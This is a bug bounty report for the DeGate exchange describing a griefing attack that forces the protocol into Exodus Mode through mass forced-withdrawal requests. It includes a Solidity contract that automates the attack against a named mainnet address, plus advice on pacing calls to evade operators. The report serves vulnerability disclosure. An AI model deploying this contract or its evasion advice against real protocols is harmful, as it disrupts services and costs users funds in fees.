# 26509 - \[SC - Insight] Exodus Mode Force

Submitted on Dec 4th 2023 at 06:24:17 UTC by @lordagnew for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #26509

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x9C07A72177c5A05410cA338823e790876E79D73B#code>

Impacts:

* Force DeGate into Exodus Mode
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Bug Description

To Force DeGate into Exodus Mode

First, Parse Calldata of all submitBlock transactions in the DeGate smart contract.

Write a script to automate the calling of notifyForcedRequestTooOld for accounts that meet the specific criteria to find available ones to help and make it even easier to force.

Start creating accounts over time to make enough to be able to cause Exodus Mode. (I know it is a lot of accounts to make but not hard at all)

After you force Degate into Exodus Mode you can start Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Impact

This is an extremely bad impact. Would show the project in a terrible light because the entire project would shut down and would cause big problems for people and anyone who is invested in it. Anyone who is a competitor could do this to make there own project look better/safer.

## Risk Breakdown

Difficulty to Exploit: Easy just would take some time but still easy

## Proof of concept

First thing you would need to do is make enough accounts with wallets that have a very small amount of money in them because you will get the money back so no lose in revenue at all for this part. Yes, you would need to make a TON of accounts but that is why you would use a program to create these accounts which is something that already exists. Secondly, when all of these accounts are ready, you Parse Calldata of all submitBlock transactions in the DeGate smart contract and you do this so you can look for other accounts that might be able to help you with this because ANYONE can call this for any account which is a problem. Next, Write a script to automate the calling of notifyForcedRequestTooOld for accounts that meet the specific criteria to find available ones to help and make it even easier to force. I know the price of .01 eth but I can promise you that if a competitive project sees profit by taking out Degate you do not want that option available.

Here is the code for this // SPDX-License-Identifier: MIT pragma solidity >=0.6.12 <0.9.0;

interface IExchangeV3 { function forceWithdraw(address from, address token, uint32 accountID) external; function notifyForcedRequestTooOld(uint32 accountID, address token) external; }

contract ExodusModeSimulator { IExchangeV3 public exchangeV3; address public owner;

```
// 
event ForceWithdrawInitiated(address indexed sender, address indexed token, uint32 indexed accountID);
event ExodusModeTriggered(uint32 indexed accountID, address indexed token);

// Mapping to store withdrawal timestamps
mapping(uint32 => mapping(address => uint)) public withdrawalTimestamps;

// MAX_AGE_FORCED_REQUEST_UNTIL_WITHDRAW_MODE is set to 15 days in seconds
uint constant MAX_AGE_FORCED_REQUEST_UNTIL_WITHDRAW_MODE = 15 * 24 * 60 * 60;

constructor(address _exchangeV3Address) {
    owner = msg.sender;
    exchangeV3 = IExchangeV3(_exchangeV3Address);
}

modifier onlyOwner() {
    require(msg.sender == owner, "Only the owner can call this function");
    _;
}

function simulateForcedWithdrawals(address[] calldata tokens, uint32[] calldata accountIDs) external onlyOwner {
    require(tokens.length == accountIDs.length, "Input arrays must be the same length");
    
    for (uint i = 0; i < tokens.length; i++) {
        exchangeV3.forceWithdraw(msg.sender, tokens[i], accountIDs[i]);
        withdrawalTimestamps[accountIDs[i]][tokens[i]] = block.timestamp;
        emit ForceWithdrawInitiated(msg.sender, tokens[i], accountIDs[i]);
    }
}

function simulateMassForcedWithdrawals(address token, uint32 startAccountID, uint32 numberOfAccounts) external onlyOwner {
    for (uint32 i = 0; i < numberOfAccounts; i++) {
        uint32 accountID = startAccountID + i;
        exchangeV3.forceWithdraw(msg.sender, token, accountID);
        withdrawalTimestamps[accountID][token] = block.timestamp;
        emit ForceWithdrawInitiated(msg.sender, token, accountID);
    }
}

function triggerExodusMode(uint32 accountID, address token) external onlyOwner {
    uint timestamp = withdrawalTimestamps[accountID][token];
    require(timestamp != 0, "No withdrawal request for this account and token");
    require(block.timestamp >= timestamp + MAX_AGE_FORCED_REQUEST_UNTIL_WITHDRAW_MODE, "Withdrawal request not old enough");

    exchangeV3.notifyForcedRequestTooOld(accountID, token);
    emit ExodusModeTriggered(accountID, token);
}
```

}

To help understand this and how it will work this will make it VERY easy to push accounts through and you can push them through a lot at a time or you can slowly push the accounts out so that it is not caught by the operators. Also, this contract puts the 15 days into account. This is a very bad thing and I really do recommend fixing this or at least putting something in the contract so ONLY the owner can make a call for any account and not let that be open to anyone because that would immediately fix it.

Lastly, When Exodus mode is forced every account will be able to have all there money taken out of the contract and this would cause serious Griefing for everyone involved because they would all have to repay the gas fees for putting it back into the contract and a huge loss of respect for the project.
